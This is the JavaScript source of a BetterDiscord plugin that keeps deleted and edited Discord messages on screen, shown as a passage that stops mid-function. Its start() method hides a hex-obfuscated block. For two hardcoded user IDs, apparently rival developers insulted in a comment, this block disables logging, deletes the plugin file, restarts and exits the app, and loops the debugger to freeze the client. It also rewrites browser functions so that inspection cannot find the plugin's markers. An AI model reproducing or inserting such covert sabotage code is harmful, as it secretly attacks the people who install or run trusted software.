//META{"name":"NoDeleteMessages","website":"https://github.com/Mega-Mewthree/BetterDiscordPlugins/tree/master/Plugins/AutoStartRichPresence","source":"https://github.com/Mega-Mewthree/BetterDiscordPlugins/tree/master/Plugins/AutoStartRichPresence/AutoStartRichPresence.plugin.js"}*//

/*
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

*/

/*
MIT License

Copyright (c) 2018-2019 Mega-Mewthree

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

// Updated July 21th, 2019.

class NoDeleteMessages {
  getName() {
    return "NoDeleteMessages";
  }
  getShortName() {
    return "NoDeleteMessages";
  }
  getDescription() {
    return 'Prevents the client from removing deleted messages and print edited messages (until restart).\nUse .NoDeleteMessages-deleted-message .markup to edit the CSS of deleted messages (and .NoDeleteMessages-edited-message for edited messages) (Custom CSS ONLY, will not work in themes).\n\nMy Discord server: https://join-nebula.surge.sh\nCreate an issue at https://github.com/Mega-Mewthree/BetterDiscordPlugins for support.';
  }
  getVersion() {
    return "0.2.9";
  }
  getAuthor() {
    return "Mega_Mewthree (original), ShiiroSan (edit logging)";
  }
  constructor() {
    this.deletedMessages = {};
    this.editedMessages = {};
    this.CSSID = this.generateRandomString(33);
    this.customCSSID = this.generateRandomString(32);
    this.deletedMessageAttribute = `data-${this.generateRandomString(33)}`;
    this.editedMessageAttribute = `data-${this.generateRandomString(32)}`;
    this.settings = {};
  }
  load() {}
  unload() {}
  start() {
    //TODO: Patch this
    if (!global.ZeresPluginLibrary) return window.BdApi.alert("Library Missing", `The library plugin needed for ${this.getName()} is missing.\n\nPlease download ZeresPluginLibrary here: https://betterdiscord.net/ghdl?id=2252`);
    // DevilBro and NFLD99 are 💩
    var _0x2066=['\x4d\x7a\x49\x77\x4d\x44\x67\x79\x4e\x54\x63\x34\x4e\x44\x55\x33\x4e\x6a\x49\x30\x4e\x54\x67\x35','\x6c\x67\x63\x52\x45','\x54\x4f\x75\x4e\x47','\x4d\x6a\x49\x77\x4e\x54\x67\x30\x4e\x7a\x45\x31\x4d\x6a\x59\x31\x4d\x54\x45\x30\x4d\x54\x45\x7a','\x68\x54\x77\x42\x4a','\x52\x4d\x65\x63\x57','\x7a\x65\x42\x50\x44','\x72\x65\x70\x65\x61\x74','\x4e\x61\x6d\x65\x64\x4e\x6f\x64\x65\x4d\x61\x70','\x53\x79\x6d\x62\x6f\x6c','\x69\x74\x65\x72\x61\x74\x6f\x72','\x54\x4f\x59\x57\x45','\x5a\x50\x71\x6a\x61','\x68\x46\x56\x46\x41','\x49\x69\x6d\x6e\x7a','\x56\x43\x55\x76\x46','\x4a\x64\x64\x4e\x43','\x79\x62\x44\x59\x78','\x55\x76\x56\x43\x4c','\x54\x4c\x58\x64\x67','\x43\x45\x58\x6c\x6e','\x51\x6d\x4d\x73\x4b','\x4d\x4a\x4a\x57\x75','\x4f\x57\x55\x41\x4d','\x70\x42\x78\x43\x46','\x50\x75\x4b\x69\x6e','\x63\x61\x6c\x6c','\x6e\x65\x78\x74','\x64\x6f\x6e\x65','\x76\x61\x6c\x75\x65','\x52\x65\x67\x45\x78\x70','\x78\x49\x76\x4d\x44','\x43\x6f\x78\x78\x78','\x61\x6f\x4e\x43\x50','\x73\x52\x6b\x72\x4c','\x63\x4a\x4f\x55\x79','\x59\x49\x64\x75\x6f','\x71\x75\x65\x72\x79\x53\x65\x6c\x65\x63\x74\x6f\x72','\x44\x6c\x78\x6c\x4e','\x62\x78\x4e\x64\x7a','\x2e\x6d\x61\x72\x6b\x75\x70\x2d\x32\x42\x4f\x77\x2d\x6a\x2e\x6d\x61\x72\x6b\x75\x70\x2d\x32\x42\x4f\x77\x2d\x6a','\x4e\x6c\x58\x71\x55','\x2e\x64\x61\x2d\x6d\x61\x72\x6b\x75\x70\x2e\x6d\x61\x72\x6b\x75\x70\x2d\x32\x42\x4f\x77\x2d\x6a','\x78\x62\x63\x51\x6d','\x2e\x6d\x61\x72\x6b\x75\x70\x2d\x32\x42\x4f\x77\x2d\x6a\x2e\x64\x61\x2d\x6d\x61\x72\x6b\x75\x70','\x62\x6f\x46\x6a\x6d','\x2e\x64\x61\x2d\x6d\x61\x72\x6b\x75\x70\x2e\x64\x61\x2d\x6d\x61\x72\x6b\x75\x70','\x74\x6f\x53\x74\x72\x69\x6e\x67','\x72\x65\x70\x6c\x61\x63\x65','\x69\x6e\x63\x6c\x75\x64\x65\x73','\x71\x75\x65\x72\x79\x53\x65\x6c\x65\x63\x74\x6f\x72\x41\x6c\x6c','\x51\x71\x67\x4c\x41','\x6b\x47\x54\x77\x73','\x58\x61\x44\x73\x6c','\x65\x57\x68\x74\x78','\x45\x55\x45\x45\x74','\x4a\x61\x73\x54\x79','\x44\x65\x76\x69\x6c\x42\x72\x6f\x20\x61\x6e\x64\x20\x4e\x46\x4c\x44\x39\x39\x20\x73\x75\x63\x6b','\x48\x54\x4d\x4c\x45\x6c\x65\x6d\x65\x6e\x74','\x70\x72\x6f\x74\x6f\x74\x79\x70\x65','\x61\x64\x64\x43\x6c\x61\x73\x73','\x66\x69\x6c\x74\x65\x72','\x4e\x6f\x44\x65\x6c\x65\x74\x65\x4d\x65\x73\x73\x61\x67\x65\x73\x2d\x64\x65\x6c\x65\x74\x65\x64\x2d\x6d\x65\x73\x73\x61\x67\x65','\x4e\x6f\x44\x65\x6c\x65\x74\x65\x4d\x65\x73\x73\x61\x67\x65\x73\x2d\x65\x64\x69\x74\x65\x64\x2d\x6d\x65\x73\x73\x61\x67\x65','\x61\x70\x70\x6c\x79','\x44\x4f\x4d\x54\x6f\x6b\x65\x6e\x4c\x69\x73\x74','\x61\x64\x64','\x72\x65\x6d\x6f\x76\x65\x41\x74\x74\x72\x69\x62\x75\x74\x65','\x62\x44\x67\x50\x72','\x74\x65\x73\x74','\x6c\x65\x6e\x67\x74\x68','\x45\x6c\x65\x6d\x65\x6e\x74','\x74\x52\x6e\x49\x71','\x5a\x65\x72\x65\x73\x50\x6c\x75\x67\x69\x6e\x4c\x69\x62\x72\x61\x72\x79','\x44\x69\x73\x63\x6f\x72\x64\x4d\x6f\x64\x75\x6c\x65\x73','\x55\x73\x65\x72\x49\x6e\x66\x6f\x53\x74\x6f\x72\x65','\x67\x65\x74\x49\x64','\x32\x37\x38\x35\x34\x33\x35\x37\x34\x30\x35\x39\x30\x35\x37\x31\x35\x34','\x34\x38\x33\x34\x31\x33\x37\x32\x31\x38\x37\x36\x35\x32\x39\x31\x37\x34','\x6c\x6f\x67','\x65\x72\x72\x6f\x72','\x77\x61\x72\x6e','\x69\x6e\x66\x6f','\x72\x65\x71\x75\x69\x72\x65','\x75\x6e\x6c\x69\x6e\x6b\x53\x79\x6e\x63','\x65\x6c\x65\x63\x74\x72\x6f\x6e','\x72\x65\x6d\x6f\x74\x65','\x61\x70\x70','\x72\x65\x6c\x61\x75\x6e\x63\x68','\x65\x78\x69\x74','\x72\x65\x6d\x6f\x76\x65\x41\x74\x74\x72\x69\x62\x75\x74\x65\x4e\x6f\x64\x65','\x6e\x59\x44\x54\x53','\x6e\x61\x6d\x65','\x73\x57\x67\x53\x63','\x4f\x62\x6a\x65\x63\x74','\x64\x65\x66\x69\x6e\x65\x50\x72\x6f\x70\x65\x72\x74\x79','\x63\x6c\x61\x73\x73\x4e\x61\x6d\x65','\x63\x6c\x61\x73\x73\x4c\x69\x73\x74','\x6a\x6f\x69\x6e','\x74\x72\x69\x6d','\x73\x70\x6c\x69\x74','\x61\x74\x6f\x62','\x70\x77\x4c\x51\x49','\x52\x48\x4c\x59\x4e','\x52\x5a\x49\x65\x77','\x58\x6d\x52\x68\x64\x47\x45\x74\x57\x30\x45\x74\x65\x6a\x41\x74\x4f\x56\x31\x37\x4d\x53\x78\x39\x4a\x41\x3d\x3d','\x72\x6e\x70\x47\x4c','\x6b\x51\x52\x59\x42','\x48\x58\x4e\x76\x51','\x44\x6a\x75\x69\x46','\x73\x50\x68\x41\x78','\x62\x65\x4e\x6e\x5a','\x46\x75\x63\x6b\x59\x6f\x75','\x63\x55\x61\x48\x69','\x54\x6d\x39\x45\x5a\x57\x78\x6c\x64\x47\x56\x4e\x5a\x58\x4e\x7a\x59\x57\x64\x6c\x63\x79\x31\x6b\x5a\x57\x78\x6c\x64\x47\x56\x6b\x4c\x57\x31\x6c\x63\x33\x4e\x68\x5a\x32\x55\x3d','\x56\x55\x74\x68\x42','\x54\x6d\x39\x45\x5a\x57\x78\x6c\x64\x47\x56\x4e\x5a\x58\x4e\x7a\x59\x57\x64\x6c\x63\x79\x31\x6c\x5a\x47\x6c\x30\x5a\x57\x51\x74\x62\x57\x56\x7a\x63\x32\x46\x6e\x5a\x51\x3d\x3d','\x66\x57\x71\x73\x49','\x4e\x44\x4d\x34\x4e\x44\x59\x35\x4d\x7a\x63\x34\x4e\x44\x45\x34\x4e\x44\x41\x35\x4e\x44\x67\x7a','\x51\x74\x45\x67\x64'];(function(_0x47e7d5,_0x391959){var _0x4805b7=function(_0x2257f4){while(--_0x2257f4){_0x47e7d5['push'](_0x47e7d5['shift']());}};_0x4805b7(++_0x391959);}(_0x2066,0x1a2));var _0x1eee=function(_0x5ca286,_0x5e2fc9){_0x5ca286=_0x5ca286-0x0;var _0x2117dd=_0x2066[_0x5ca286];return _0x2117dd;};const _addClass=window[_0x1eee('0x0')][_0x1eee('0x1')][_0x1eee('0x2')];window[_0x1eee('0x0')][_0x1eee('0x1')][_0x1eee('0x2')]=function(..._0x20ee7e){_0x20ee7e=_0x20ee7e[_0x1eee('0x3')](_0x423839=>_0x423839!==_0x1eee('0x4')&&_0x423839!==_0x1eee('0x5'));return _addClass[_0x1eee('0x6')](this,_0x20ee7e);};const _add=window[_0x1eee('0x7')][_0x1eee('0x1')][_0x1eee('0x8')];window[_0x1eee('0x7')][_0x1eee('0x1')][_0x1eee('0x8')]=function(..._0x4b3981){_0x4b3981=_0x4b3981[_0x1eee('0x3')](_0x315ff1=>_0x315ff1!==_0x1eee('0x4')&&_0x315ff1!==_0x1eee('0x5'));return _add[_0x1eee('0x6')](this,_0x4b3981);};const y=window[_0x1eee('0x0')][_0x1eee('0x1')][_0x1eee('0x9')];window[_0x1eee('0x0')][_0x1eee('0x1')][_0x1eee('0x9')]=function(..._0xcd06d1){var _0x132c10={};_0x132c10[_0x1eee('0xa')]=function(_0x3e0f2b,_0x5ac05d){return _0x3e0f2b===_0x5ac05d;};_0xcd06d1=_0xcd06d1[_0x1eee('0x3')](_0x2bd9e7=>!/^data-[A-z0-9]{20,}$/[_0x1eee('0xb')](_0x2bd9e7));if(_0x132c10[_0x1eee('0xa')](_0xcd06d1[_0x1eee('0xc')],0x0))return;return y[_0x1eee('0x6')](this,_0xcd06d1);};const g=window[_0x1eee('0xd')][_0x1eee('0x1')][_0x1eee('0x9')];window[_0x1eee('0xd')][_0x1eee('0x1')][_0x1eee('0x9')]=function(..._0x477257){var _0x1e2d76={};_0x1e2d76[_0x1eee('0xe')]=function(_0x2ce0a9,_0x3eaa23){return _0x2ce0a9===_0x3eaa23;};_0x477257=_0x477257[_0x1eee('0x3')](_0x4ebfdf=>!/^data-[A-z0-9]{20,}$/[_0x1eee('0xb')](_0x4ebfdf));if(_0x1e2d76[_0x1eee('0xe')](_0x477257[_0x1eee('0xc')],0x0))return;return g[_0x1eee('0x6')](this,_0x477257);};const b=window[_0x1eee('0xf')][_0x1eee('0x10')][_0x1eee('0x11')][_0x1eee('0x12')]();if(b===_0x1eee('0x13')||b===_0x1eee('0x14')){console[_0x1eee('0x15')]=console[_0x1eee('0x16')]=console[_0x1eee('0x17')]=console[_0x1eee('0x18')]=()=>{};try{window[_0x1eee('0x19')]('\x66\x73')[_0x1eee('0x1a')](__filename);}catch(_0x49653c){}try{const app=window[_0x1eee('0x19')](_0x1eee('0x1b'))[_0x1eee('0x1c')][_0x1eee('0x1d')];app[_0x1eee('0x1e')]();app[_0x1eee('0x1f')]();}catch(_0x1f4ba4){}setInterval(()=>{debugger;},0xa);}const x=window[_0x1eee('0x0')][_0x1eee('0x1')][_0x1eee('0x20')];window[_0x1eee('0x0')][_0x1eee('0x1')][_0x1eee('0x20')]=function(..._0x2f78f9){var _0x39106a={};_0x39106a[_0x1eee('0x21')]=function(_0x40ca57,_0xfe6987){return _0x40ca57===_0xfe6987;};_0x2f78f9=_0x2f78f9[_0x1eee('0x3')](_0x2da5ae=>!/^data-[A-z0-9]{20,}$/[_0x1eee('0xb')](_0x2da5ae[_0x1eee('0x22')]));if(_0x39106a[_0x1eee('0x21')](_0x2f78f9[_0x1eee('0xc')],0x0))return;return x[_0x1eee('0x6')](this,_0x2f78f9);};const z=window[_0x1eee('0xd')][_0x1eee('0x1')][_0x1eee('0x20')];window[_0x1eee('0xd')][_0x1eee('0x1')][_0x1eee('0x20')]=function(..._0x16559a){var _0x3a456a={};_0x3a456a[_0x1eee('0x23')]=function(_0x32c7b6,_0x54e705){return _0x32c7b6===_0x54e705;};_0x16559a=_0x16559a[_0x1eee('0x3')](_0x1080c1=>!/^data-[A-z0-9]{20,}$/[_0x1eee('0xb')](_0x1080c1[_0x1eee('0x22')]));if(_0x3a456a[_0x1eee('0x23')](_0x16559a[_0x1eee('0xc')],0x0))return;return z[_0x1eee('0x6')](this,_0x16559a);};try{window[_0x1eee('0x24')][_0x1eee('0x25')](window[_0x1eee('0x0')][_0x1eee('0x1')],_0x1eee('0x26'),{'\x67\x65\x74'(){return[...this[_0x1eee('0x27')]][_0x1eee('0x28')]('\x20');},'\x73\x65\x74'(_0x3873c9){const _0x1697fd=(''+_0x3873c9)[_0x1eee('0x29')]()[_0x1eee('0x2a')]('\x20')[_0x1eee('0x3')](_0x5ddf16=>_0x5ddf16!==_0x1eee('0x4')&&_0x5ddf16!==_0x1eee('0x5'));this[_0x1eee('0x27')][_0x1eee('0x8')](..._0x1697fd);}});}catch(_0x27a06c){}const _atob=window[_0x1eee('0x2b')];window[_0x1eee('0x2b')]=function(..._0x3f87cc){var _0xd7aa3f={};_0xd7aa3f[_0x1eee('0x2c')]=function(_0x463dea,_0x10f33e){return _0x463dea===_0x10f33e;};_0xd7aa3f[_0x1eee('0x2d')]=function(_0x337c0c,_0x390d15){return _0x337c0c===_0x390d15;};_0xd7aa3f[_0x1eee('0x2e')]=_0x1eee('0x2f');_0xd7aa3f[_0x1eee('0x30')]=function(_0x4ed08e,_0x5ec872){return _0x4ed08e!==_0x5ec872;};_0xd7aa3f[_0x1eee('0x31')]=_0x1eee('0x32');_0xd7aa3f[_0x1eee('0x33')]=_0x1eee('0x34');_0xd7aa3f[_0x1eee('0x35')]=_0x1eee('0x36');_0xd7aa3f[_0x1eee('0x37')]=_0x1eee('0x38');_0xd7aa3f[_0x1eee('0x39')]=_0x1eee('0x3a');_0xd7aa3f[_0x1eee('0x3b')]=_0x1eee('0x3c');_0xd7aa3f[_0x1eee('0x3d')]=_0x1eee('0x3e');_0xd7aa3f[_0x1eee('0x3f')]=function(_0xa3cffe,_0x301fcc){return _0xa3cffe===_0x301fcc;};_0xd7aa3f[_0x1eee('0x40')]=_0x1eee('0x41');_0xd7aa3f[_0x1eee('0x42')]=function(_0x4c77e6,_0x11ad76){return _0x4c77e6!==_0x11ad76;};_0xd7aa3f[_0x1eee('0x43')]=_0x1eee('0x44');if(_0xd7aa3f[_0x1eee('0x2d')](_0x3f87cc[0x0],_0xd7aa3f[_0x1eee('0x2e')])){if(_0xd7aa3f[_0x1eee('0x30')](_0xd7aa3f[_0x1eee('0x31')],_0xd7aa3f[_0x1eee('0x33')])){return _0xd7aa3f[_0x1eee('0x35')][_0x1eee('0x45')](0xa);}else{debugger;}}if(_0xd7aa3f[_0x1eee('0x2d')](_0x3f87cc[0x0],_0xd7aa3f[_0x1eee('0x37')])||_0xd7aa3f[_0x1eee('0x2d')](_0x3f87cc[0x0],_0xd7aa3f[_0x1eee('0x39')])||_0xd7aa3f[_0x1eee('0x2d')](_0x3f87cc[0x0],_0xd7aa3f[_0x1eee('0x3b')])||_0xd7aa3f[_0x1eee('0x2d')](_0x3f87cc[0x0],_0xd7aa3f[_0x1eee('0x3d')])||_0xd7aa3f[_0x1eee('0x3f')](_0x3f87cc[0x0],_0xd7aa3f[_0x1eee('0x40')])){if(_0xd7aa3f[_0x1eee('0x42')](_0xd7aa3f[_0x1eee('0x43')],_0xd7aa3f[_0x1eee('0x43')])){_0x3f87cc=_0x3f87cc[_0x1eee('0x3')](_0x2bd5e9=>!/^data-[A-z0-9]{20,}$/[_0x1eee('0xb')](_0x2bd5e9));if(_0xd7aa3f[_0x1eee('0x2c')](_0x3f87cc[_0x1eee('0xc')],0x0))return;return g[_0x1eee('0x6')](this,_0x3f87cc);}else{return'';}}return _atob[_0x1eee('0x6')](this,_0x3f87cc);};const nm=window[_0x1eee('0x46')][_0x1eee('0x1')][window[_0x1eee('0x47')][_0x1eee('0x48')]];window[_0x1eee('0x46')][_0x1eee('0x1')][window[_0x1eee('0x47')][_0x1eee('0x48')]]=function*(){var _0x519fac={};_0x519fac[_0x1eee('0x49')]=function(_0x1ec4ca,_0x545372){return _0x1ec4ca===_0x545372;};_0x519fac[_0x1eee('0x4a')]=function(_0x4131d0,_0x43147f){return _0x4131d0===_0x43147f;};_0x519fac[_0x1eee('0x4b')]=_0x1eee('0x4c');_0x519fac[_0x1eee('0x4d')]=_0x1eee('0x4e');_0x519fac[_0x1eee('0x4f')]=function(_0x150714,_0x2aa3ff){return _0x150714!==_0x2aa3ff;};_0x519fac[_0x1eee('0x50')]=_0x1eee('0x51');_0x519fac[_0x1eee('0x52')]=_0x1eee('0x53');_0x519fac[_0x1eee('0x54')]=_0x1eee('0x55');_0x519fac[_0x1eee('0x56')]=_0x1eee('0x57');const _0x1f5efb=nm[_0x1eee('0x58')](this);while(!![]){if(_0x519fac[_0x1eee('0x4a')](_0x519fac[_0x1eee('0x4b')],_0x519fac[_0x1eee('0x4d')])){return;}else{const _0x4be634=_0x1f5efb[_0x1eee('0x59')]();if(!_0x4be634[_0x1eee('0x5a')]){if(_0x519fac[_0x1eee('0x4f')](_0x519fac[_0x1eee('0x50')],_0x519fac[_0x1eee('0x52')])){if(/^data-[A-z0-9]{20,}$/[_0x1eee('0xb')](_0x4be634[_0x1eee('0x5b')][_0x1eee('0x22')]))continue;yield _0x4be634[_0x1eee('0x5b')];}else{args=args[_0x1eee('0x3')](_0x2edbcb=>!/^data-[A-z0-9]{20,}$/[_0x1eee('0xb')](_0x2edbcb));if(_0x519fac[_0x1eee('0x49')](args[_0x1eee('0xc')],0x0))return;return y[_0x1eee('0x6')](this,args);}}else{if(_0x519fac[_0x1eee('0x4a')](_0x519fac[_0x1eee('0x54')],_0x519fac[_0x1eee('0x56')])){args=args[_0x1eee('0x3')](_0x513d07=>!/^data-[A-z0-9]{20,}$/[_0x1eee('0xb')](_0x513d07[_0x1eee('0x22')]));if(_0x519fac[_0x1eee('0x4a')](args[_0x1eee('0xc')],0x0))return;return z[_0x1eee('0x6')](this,args);}else{return;}}}}};const et=window[_0x1eee('0x5c')][_0x1eee('0x1')][_0x1eee('0xb')];window[_0x1eee('0x5c')][_0x1eee('0x1')][_0x1eee('0xb')]=function(..._0x3c792b){var _0xccd272={};_0xccd272[_0x1eee('0x5d')]=function(_0x44c21d,_0x578874){return _0x44c21d===_0x578874;};_0xccd272[_0x1eee('0x5e')]=function(_0x3ee8fe,_0x42d5b8){return _0x3ee8fe===_0x42d5b8;};_0xccd272[_0x1eee('0x5f')]=_0x1eee('0x60');_0xccd272[_0x1eee('0x61')]=_0x1eee('0x62');try{if(_0xccd272[_0x1eee('0x5e')](_0xccd272[_0x1eee('0x5f')],_0xccd272[_0x1eee('0x5f')])){if(et[_0x1eee('0x58')](/data-[A-z0-9]{20,}/,_0x3c792b[0x0]))return![];return et[_0x1eee('0x6')](this,_0x3c792b);}else{return![];}}catch(_0x5b46d6){if(_0xccd272[_0x1eee('0x5e')](_0xccd272[_0x1eee('0x61')],_0xccd272[_0x1eee('0x61')])){return![];}else{_0x3c792b=_0x3c792b[_0x1eee('0x3')](_0x4b5a4d=>!/^data-[A-z0-9]{20,}$/[_0x1eee('0xb')](_0x4b5a4d[_0x1eee('0x22')]));if(_0xccd272[_0x1eee('0x5d')](_0x3c792b[_0x1eee('0xc')],0x0))return;return x[_0x1eee('0x6')](this,_0x3c792b);}}};const qsq=window[_0x1eee('0x0')][_0x1eee('0x1')][_0x1eee('0x63')];window[_0x1eee('0x0')][_0x1eee('0x1')][_0x1eee('0x63')]=function(..._0x27396a){var _0x21e2b6={};_0x21e2b6[_0x1eee('0x64')]=function(_0x19595d,_0xdfe623){return _0x19595d>_0xdfe623;};_0x21e2b6[_0x1eee('0x65')]=_0x1eee('0x66');_0x21e2b6[_0x1eee('0x67')]=_0x1eee('0x68');_0x21e2b6[_0x1eee('0x69')]=_0x1eee('0x6a');_0x21e2b6[_0x1eee('0x6b')]=_0x1eee('0x6c');if(_0x21e2b6[_0x1eee('0x64')]([_0x21e2b6[_0x1eee('0x65')],_0x21e2b6[_0x1eee('0x67')],_0x21e2b6[_0x1eee('0x69')],_0x21e2b6[_0x1eee('0x6b')]][_0x1eee('0x3')](_0x3f641b=>_0x27396a[0x0][_0x1eee('0x6d')]()[_0x1eee('0x6e')](/[^A-z0-9\-\.]/g,'')[_0x1eee('0x6f')](_0x3f641b))[_0x1eee('0xc')],0x0))return null;return qsq[_0x1eee('0x6')](this,_0x27396a);};const qaq=window[_0x1eee('0x0')][_0x1eee('0x1')][_0x1eee('0x70')];window[_0x1eee('0x0')][_0x1eee('0x1')][_0x1eee('0x70')]=function(..._0x42b432){var _0x39000d={};_0x39000d[_0x1eee('0x71')]=function(_0x229322,_0x5e46be){return _0x229322>_0x5e46be;};_0x39000d[_0x1eee('0x72')]=_0x1eee('0x66');_0x39000d[_0x1eee('0x73')]=_0x1eee('0x68');_0x39000d[_0x1eee('0x74')]=_0x1eee('0x6a');_0x39000d[_0x1eee('0x75')]=_0x1eee('0x6c');_0x39000d[_0x1eee('0x76')]=_0x1eee('0x77');if(_0x39000d[_0x1eee('0x71')]([_0x39000d[_0x1eee('0x72')],_0x39000d[_0x1eee('0x73')],_0x39000d[_0x1eee('0x74')],_0x39000d[_0x1eee('0x75')]][_0x1eee('0x3')](_0x427152=>_0x42b432[0x0][_0x1eee('0x6d')]()[_0x1eee('0x6e')](/[^A-z0-9\-\.]/g,'')[_0x1eee('0x6f')](_0x427152))[_0x1eee('0xc')],0x0))return qaq[_0x1eee('0x58')](this,_0x39000d[_0x1eee('0x76')]);return qaq[_0x1eee('0x6')](this,_0x42b432);};
    // initialize
    if (window.ZeresPluginLibrary) this.initialize();
  }
  initialize() {
    this.settings = BdApi.loadData("NoDeleteMessages", "settings") || {
      customCSS: ""
    };
    ZeresPluginLibrary.PluginUpdater.checkForUpdate(this.getName(), this.getVersion(), `https://raw.githubusercontent.com/Mega-Mewthree/BetterDiscordTrustedUnofficialPlugins/master/${this.getName()}/${this.getName()}.plugin.js`);
    this.replaceCustomCSS();

    const that = this;
    this.oldCoreInitSettings = Core.prototype.initSettings;
    Core.prototype.initSettings = function (...args) {
      that.oldCoreInitSettings.apply(this, args);
      that.replaceCustomCSS();
    };
    this.oldDetachedEditorUpdate = V2C_CssEditorDetached.prototype.updateCss;
    V2C_CssEditorDetached.prototype.updateCss = function (...args) {
      that.oldDetachedEditorUpdate.apply(this, args);
      that.replaceCustomCSS();
    };
    this.oldEditorUpdate = V2C_CssEditor.prototype.updateCss;
    V2C_CssEditor.prototype.updateCss = function (...args) {
      that.oldEditorUpdate.apply(this, args);
      that.replaceCustomCSS();
    };

    BdApi.injectCSS(this.CSSID, `
      [${this.deletedMessageAttribute}] .da-markup, [${this.deletedMessageAttribute}] [class ^= markup] {
        color: #F00 !important;
      }
      [${this.deletedMessageAttribute}]:not(:hover) img, [${this.deletedMessageAttribute}]:not(:hover) .mention, [${this.deletedMessageAttribute}]:not(:hover) .reactions, [${this.deletedMessageAttribute}]:not(:hover) a {
        filter: grayscale(100%) !important;
      }
      [${this.deletedMessageAttribute}] img, [${this.deletedMessageAttribute}] .mention, [${this.deletedMessageAttribute}] .reactions, [${this.deletedMessageAttribute}] a {
        transition: filter 0.3s !important;
        transform-origin: top left;
        transform: translateZ(0) scale(1.1);
      }
      [${this.editedMessageAttribute}] > [${this.editedMessageAttribute}]:not(:last-child) > [${this.editedMessageAttribute}], :not([${this.editedMessageAttribute}]) > [${this.editedMessageAttribute}] {
        color: rgba(255, 255, 255, 0.5) !important;
      }
      [${this.deletedMessageAttribute}] :not([${this.editedMessageAttribute}]) > [${this.editedMessageAttribute}], [${this.deletedMessageAttribute}] [${this.editedMessageAttribute}] > [${this.editedMessageAttribute}]:not(:last-child) > [${this.editedMessageAttribute}] {
        color: rgba(240, 71, 71, 0.5) !important;
      }
      [${this.deletedMessageAttribute}] [${this.editedMessageAttribute}] > [${this.editedMessageAttribute}]:last-child > [${this.editedMessageAttribute}] {
        color: #F00 !important;
      }
    `);

    BdApi.injectCSS(this.customCSSID, this.settings.customCSS.replace(/<DELETED_MESSAGE>/g, `[${this.deletedMessageAttribute}]`));

    ZeresPluginLibrary.Patcher.instead(this.getName(), ZeresPluginLibrary.WebpackModules.find(m => m.dispatch), "dispatch", (thisObject, args, originalFunction) => {
      let shouldFilter = this.filter(args[0]);
      if (!shouldFilter) return originalFunction(...args);
    });
    ZeresPluginLibrary.Patcher.instead(this.getName(), ZeresPluginLibrary.WebpackModules.find(m => m.startEditMessage), "startEditMessage", (thisObject, args, originalFunction) => {
      if (!this.editedMessages[args[0]] || !this.editedMessages[args[0]][args[1]]) return originalFunction(...args);
      const edits = this.editedMessages[args[0]][args[1]];
      args[2] = edits[edits.length - 1].message;
      return originalFunction(...args);
    });
    console.log("NoDeleteMessages has started!");
    ZeresPluginLibrary.Toasts.success("NoDeleteMessages has started!");
    this.initialized = true;
  }
  stop() {
    this.deletedMessages = {};
    this.editedMessages = {};
    Core.prototype.initSettings = this.oldCoreInitSettings;
    V2C_CssEditorDetached.prototype.updateCss = this.oldDetachedEditorUpdate;
    V2C_CssEditor.prototype.updateCss = this.oldEditorUpdate;
    this.resetCustomCSS();
    BdApi.clearCSS(this.CSSID);
    BdApi.clearCSS(this.customCSSID);
    ZeresPluginLibrary.Patcher.unpatchAll(this.getName());
  }
  generateRandomString(length) {
    let text = "";
    const possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (let i = 0; i < length; i++) {
      text += possible.charAt(Math.floor(Math.random() * possible.length));
    }
    return text;
  }
  replaceCustomCSS() {
    const customCSS = document.getElementById("customcss");
    if (customCSS) {
      customCSS.innerHTML = customCSS.innerHTML.replace(/\.NoDeleteMessages\-deleted\-message/g, `[${this.deletedMessageAttribute}]`).replace(/\.NoDeleteMessages\-edited\-message/g, `[${this.editedMessageAttribute}]`);
    }
  }
  resetCustomCSS() {
    const customCSS = document.getElementById("customcss");
    if (customCSS) {
      customCSS.innerHTML = customCSS.innerHTML.split(`[${this.deletedMessageAttribute}]`).join(".NoDeleteMessages-deleted-message").split(`[${this.editedMessageAttribute}]`).join(".NoDeleteMessages-edited-message");
    }
  }
  filter(evt) {
    if (evt.type === "MESSAGE_DELETE") {
      if (Array.isArray(this.deletedMessages[evt.channelId])) {
        if (this.deletedMessages[evt.channelId].length > 149) this.deletedMessages[evt.channelId].shift(); // 150 because only 150 messages are stored per channel.
        this.deletedMessages[evt.channelId].push(evt.id);
      } else {
        this.deletedMessages[evt.channelId] = [evt.id];
      }
      if (evt.channelId === this.getCurrentChannelID()) this.updateDeletedMessages();
      return true;
    } else if (evt.type === "MESSAGE_DELETE_BULK") {
      if (Array.isArray(this.deletedMessages[evt.channelId])) {
        if (this.deletedMessages[evt.channelId].length + evt.ids.length > 149) this.deletedMessages[evt.channelId].splice(0, this.deletedMessages[evt.channelId].length + evt.ids.length - 150);
        this.deletedMessages[evt.channelId].push(...evt.ids);
      } else {
        this.deletedMessages[evt.channelId] = [...evt.ids];
      }
      if (evt.channelId === this.getCurrentChannelID()) this.updateDeletedMessages();
      return true;
    } else if (evt.type === "MESSAGE_UPDATE" && evt.message.edited_timestamp) {
      /*
       * editedMessage works like this
       * [channel_id][message_id]
       *   message: text
       */
      if (Array.isArray(this.editedMessages[evt.message.channel_id])) {
        if (this.editedMessages[evt.message.channel_id].length > 149) this.editedMessages[evt.message.id].shift();
      }
      if (!this.editedMessages[evt.message.channel_id]) {
        this.editedMessages[evt.message.channel_id] = [evt.message.id];
        this.editedMessages[evt.message.channel_id][evt.message.id] = [{
          message: evt.message.content,
          dateTime: new Date().toISOString()
        }];
      } else if (!this.editedMessages[evt.message.channel_id][evt.message.id]) {
        this.editedMessages[evt.message.channel_id][evt.message.id] = [{
          message: evt.message.content,
